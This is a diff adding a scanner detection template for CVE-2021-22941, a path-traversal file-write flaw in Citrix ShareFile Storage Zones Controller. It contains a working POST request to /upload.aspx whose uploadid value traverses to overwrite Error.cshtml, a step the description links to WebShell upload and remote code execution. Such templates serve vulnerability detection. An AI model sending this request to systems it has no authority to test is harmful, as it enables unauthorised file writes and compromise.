@@ -1,0 +1,34 @@
+[info]
+author = "ave"
+description = "Citrix ShareFile Storage Zones Controller 上传接口路径遍历漏洞检测。通过向 /upload.aspx 发送包含路径遍历序列的 uploadid 参数，尝试覆盖 Error.cshtml 文件，若响应成功则表示目标实例存在未授权文件写入漏洞，攻击者可利用该漏洞上传 WebShell 实现远程代码执行。"
+id = "POC-AVE-2021-0806"
+name = "Citrix ShareFile Storage Zones Controller 路径遍历 RCE 漏洞 PoC"
+severity = "critical"
+tags = [
+    "cve-2021-22941",
+    "ave-2021-0806",
+]
+vuln_id = [
+    "CVE-2021-22941",
+    "AVE-2021-0806",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/upload.aspx"
+protocol = "http"
+
+[poc.requests.body]
+content = "uploadid=..%2f..%2fConfigService%5cViews%5cShared%5cError.cshtml&bp=123&accountid=123"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
